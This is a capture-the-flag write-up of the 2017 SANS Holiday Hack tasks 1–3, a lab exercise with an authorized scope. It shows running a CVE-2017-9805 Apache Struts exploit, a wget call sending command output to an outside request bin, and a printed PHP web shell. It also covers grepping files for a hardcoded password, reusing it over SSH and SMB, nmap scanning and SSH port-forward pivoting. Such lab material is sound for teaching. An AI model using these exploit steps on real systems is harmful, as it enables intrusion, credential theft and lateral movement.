# 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?

Some snowball bouncing later...

![3x Conveyor](task1/snowball_1.png)

We are rewarded with [GreatBookPage1.pdf](book/GreatBookPage1.pdf). The title of the page is "About This Book...".


# 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

Looking at the source, we find a link to the development version:
```html
<!-- Development version -->
<a href="http://dev.northpolechristmastown.com" style="display: none;">Access Development Version</a>
```

The development version takes us to a "Toy Request Form", where we can add, edit and remove toy requests. It has an interesting footer:

```html
<div id="the-footer"><p class="center-it">Powered By: <a href="https://struts.apache.org/">Apache Struts</a></p></div>
<!-- Friend over at Equal-facts Inc recommended this framework-->
```
"Equal-facts" seems very likely to refer to Equifax, who was recently hacked due to an Apache Structs vulnerability [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638). However, after "talking to" Sparkle Redberry  (aka rolling a snowball to the exit of the Winconceivable: The Cliffs of Winsanity level) we learn that the site is apperently not vulnerable to this same issue:

> That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.
> 
> -- Sparkle Redberry, Hint 6

We also confirm this by running the [metasploit module for CVE-2017-5638](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_content_type_ognl.rb) and seeing that the site does indeed not seem to be affected. Fortunately (!?) there are also other recently disclosed Structs vulnerabilites, as hinted to by the last part of Hint 6.

The second Apache Structs CVE that comes up a lot when searching for recent vulnerabilities is [CVE-2017-9805](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9805), a remote code execution flaw related to XML decoding. That it is this flaw we are supposed to use is also more or less confirmed in the next hint from Sparkle Redberry:

> Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. Here is a [useful article](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code).
>
> -- Sparkle Redberry, Hint 7

The [useful article](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) explains to us the importance of being able to alter public exploits, then gives us [yet another public exploit](https://github.com/chrisjd20/cve-2017-9805.py). Let's see if we can get this improved version working.

After fixing some python 3 incompatablities (doing a little `string->bytes->base64->string` dance) it does seem like the exploit is working:

```
> python .\task2\cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c whoami
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
```

We can verify this by, for example, running wget/curl on site where we can monitor for requests. https://requestb.in/
make this very easy, set up a private bin and have the server wget to it:

```
> python .\task2\cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "wget https://requestb.in/[BIN_ID]?a=$(whoami)"
```

After refresing the inspect view of our request bin we see that the server did make a request, 
confirming that the exploit is working. We also find that the current user is `alabaster_snowball`:

![Task2: Exploit Working](task2/task2_exploit_working.png)

Using the same techique we can run shell commands and get their response fairly easily. It's still a
bit more annoying than we would like though. One of the earlier hints tells us there is a webshell
already on the server, why don't we find that instead?

> Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.
>
> -- Sparkle Redberry, Hint 3


Command                                                  | Response 
--------                                                 | --------
 `find -name '*.php'`                                    | `./tmp/dillydilly1337.php ./var/www/html/.b0w7Q9w081A909Y8GzA7.php ./var/www/html/.VaZQaWt70e4dVAS0g0TS.php ./var/www/html/dillydilly1337.php ./var/www/html/process.php ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php`
 `cat ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php | base64` | `PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFtlXSkgLiAiPC9wcmU+IjsgPz4=`

The `.K2tN5T3RX2x6j2NnZ3W1.php` seems to be a simple enough web shell:

```php
<?php echo "<pre>" . shell_exec($_GET[e]) . "</pre>"; ?>
```

We find the shell by visiting https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php. Notice that we are now 
back on the "main" site and no longer on the java-based dev domain. 


## What is the topic of The Great Book page available in the web root of the server?
The first question of the task should now be simple,
we have a shell and can run commands. Let's first find and extract the great book chapter:

```
$ ls -la
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=ls%20-la

total 1812
drwxrwxrwt 6 www-data           www-data              4096 Dec 16 10:18 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
                                [...]
-rw-r--r-- 1 alabaster_snowball alabaster_snowball      56 Dec 16 03:44 .K2tN5T3RX2x6j2NnZ3W1.php
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
                                [...]

$ base64 GreatBookPage2.pdf
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=base64%20GreatBookPage2.pdf

[...]
```

We then decode the base64 locally, giving us the [GreatBookPage2.pdf](book/GreatBookPage2.pdf)!
The topic of the Great Book is "On The Topic Of Flying Animals". We also make sure to enter
its sha1 hash (`aa814d1c25455480942cb4106e6cde84be86fb30`) on the Stocking page to add it to
our stocking.

It should also be noted that the web shell we are using is owned by the current user and created
after the level was started. This probably means we are using someone elses web shell, and not the
one hinted to in Hint 3. But oh well, what works works :).

## What is Alabaster Snowball's password?

Hint 8 again points us in the direction of the development site:

> Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.
>
> -- Sparkle Redberry, Hint 8

The first step would then be to find where on the file system that it is located. Since it's a java webapp,
let's assume it has a .jar somewhere close:

```
$ find / -name *.jar
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=find%20/%20-name%20*.jar

/usr/share/java/libintl.jar
/opt/apache-tomcat/webapps/ROOT/WEB-INF/lib/struts2-convention-plugin-2.5.12.jar
/opt/apache-tomcat/webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar
[...]
```

It seems like the site is located in `/opt/apache-tomcat/webapps/ROOT/`. Let's see if we are lucky
enough that we can simply grep for the password 
(see also: [How do I find all files containing specific text on Linux?
](https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux)):

```
$ grep -C 4 -rnw '/opt/apache-tomcat/webapps/ROOT/' -e 'password'
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=grep%20-C%204%20-rnw%20%27/opt/apache-tomcat/webapps/ROOT/%27%20-e%20%27password%27

[...]
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-1-    public class Connect {
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-2-            final String host = "localhost";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-3-            final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:4:            final String password = "stream_unhappy_buy_loss";   
[...]
```

We find a password used for MySql. Judging by the hint earlier, perhaps this is also the password
for the linux user?

We can confirm this by logging in to the server via ssh:
```
peter@peter-VirtualBox:~/Desktop$ ssh alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s.northpolechristmastown.com's password: 
Linux l2s 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec 16 11:08:13 2017 from 10.142.0.2
alabaster_snowball@l2s:/tmp/asnow.vZQOUSD0GKHr8q1lf97RX9cq$ 
```

Alabaster Snowball's password is `stream_unhappy_buy_loss`.


# 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?

For some reason, `nmap` is already installed on the Letters to Santa system. We are also told that
the server we are looking for is in the 10.142.0.0/24 subnet from the scope section:

> SCOPE: For this entire challenge, you are authorized to attack ONLY the Letters to Santa system at l2s.northpolechristmastown.com AND other systems on the internal 10.142.0.0/24 network that you access through the Letters to Santa system. 

Since we are looking for an SMB server, we also have to tell nmap to include the standard TCP port used by SMB (445)
in its scan. This is also made clear from the first hint to the level:

> Nmap has default host discovery checks that may not discover all hosts. To customize which ports Nmap looks for during host discovery, use -PS with a port number, such as -PS123 to check TCP port 123 to determine if a host is up.
>
> -- Holly Evergreen, Hint 1

Performing the scan (again using the web shell from before), we find a couple of internal servers:

```
$ nmap -PS445 10.142.0.0/24
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=nmap%20-PS445%2010.142.0.0/24

Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-16 14:50 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00022s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4444/tcp open  krb524
5555/tcp open  freeciv

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00021s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
8080/tcp open  http-proxy

Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00072s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 256 IP addresses (5 hosts up) scanned in 6.46 seconds
```

Currently we are only intrested in the smb server, `hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)`.
We want to find the file server share name and to do so we probably have to talk to the server over the
smb protocol. The [`smbclient`](http://www.tldp.org/HOWTO/SMB-HOWTO-8.html), which seems to be included by
default for at least Ubuntu, should do fine.

There is a problem though, we do not seem to be able to run `smbclient` via our web shell:

```
$ smbclient || echo failed
https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=smbclient%20||%20echo%20failed

failed
```

Fourtunately, we do have ssh access to the letters to santa server. Logging in directly to the
server brings us to a very locked down account that is of no real use. But, ssh can also be used
to forward traffic on local ports via the remote host. Using ssh port forwarding, we can setup
a connection to the internal smb server via the letters to santa server:

```
peter@peter-VirtualBox:~$ ssh -N -L 4455:hhc17-smb-server.c.holidayhack2017.internal:445 alabaster_snowball@l2s.northpolechristmastown.com
```

The command forwards connection on the local port 4455 to port 445 on the 
`hhc17-smb-server.c.holidayhack2017.internal` server, via the ssh connection
to `l2s.northpolechristmastown.com`. We can then point the `smbclient` to our 
local port 4455 and we are able to talk to the internal smb server.

The only thing remaining now is the username and password. But it turns out that
Alabaster Snowball is rather lazy... Reusing the same combination grants us access
also on the smb server:

```
peter@peter-VirtualBox:~$ smbclient -L localhost -p 4455 -U alabaster_snowball%stream_unhappy_buy_loss
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	FileStor        Disk      
	IPC$            IPC       Remote IPC
```

Having found the name of the shares, let's try connecting to them. Both the
`ADMIN$` and `C$` give us an error saying `NT_STATUS_BAD_NETWORK_NAME`. Google
helps us translate this to mean that we are not allowed to access those Disks.
We can connect to the `FileStor` disk though:

```
$ smbclient '\\localhost\FileStor\' -p 4455 -U alabaster_snowball%stream_unhappy_buy_loss
Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
smb: \> 
```

Using the `ls` and `get` command, we find and retreive the next book page (the other files did not have much useful content in them):

```
smb: \> ls
  .                                   D        0  Wed Dec  6 22:51:46 2017
  ..                                  D        0  Wed Dec  6 22:51:46 2017
  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 22:44:17 2017
  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 20:21:44 2017
  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 20:01:36 2017
  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 22:47:28 2017
  Naughty and Nice List.csv           A    10245  Thu Nov 30 20:42:00 2017
  Naughty and Nice List.docx          A    60344  Wed Dec  6 22:51:25 2017

		13106687 blocks of size 4096. 9627423 blocks available

smb: \> get GreatBookPage3.pdf
```

With that, the task is complete!

The file server share name is "FileStor".
The sha1 of [GreatBookPage3.pdf](book/GreatBookPage3.pdf)
is `57737da397cbfda84e88b573cd96d45fcf34a5da`.

